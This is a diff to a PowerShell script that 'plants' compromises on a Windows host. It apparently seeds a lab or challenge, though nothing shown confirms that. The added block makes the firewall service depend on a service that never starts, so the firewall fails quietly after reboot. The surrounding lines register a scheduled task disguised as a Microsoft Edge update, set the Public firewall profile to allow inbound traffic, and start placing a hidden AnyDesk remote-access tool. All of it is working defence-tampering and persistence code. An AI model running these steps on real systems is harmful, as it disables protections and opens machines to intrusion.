@@ -173,6 +173,11 @@ Plant 'task-wininit' {
     Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskUserUA' -Action $a -Trigger $t -ErrorAction Stop | Out-Null
     Disable-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskUserUA' | Out-Null
 }
+Plant 'mpssvc-depends-sense' {
+    # Beyond Journey's End: the firewall made to depend on a service that never starts. The running firewall keeps running.
+    sc.exe config MpsSvc depend= mpsdrv/bfe/Sense | Out-Null
+    if ($LASTEXITCODE -ne 0) { throw "sc config exit $LASTEXITCODE" }
+}
 Plant 'fw-public-allow' { Set-NetFirewallProfile -Profile Public -DefaultInboundAction Allow -ErrorAction Stop }
 Plant 'hidden-anydesk' {
     $f = Join-Path ([Environment]::GetFolderPath('Desktop')) 'AnyDesk.exe'
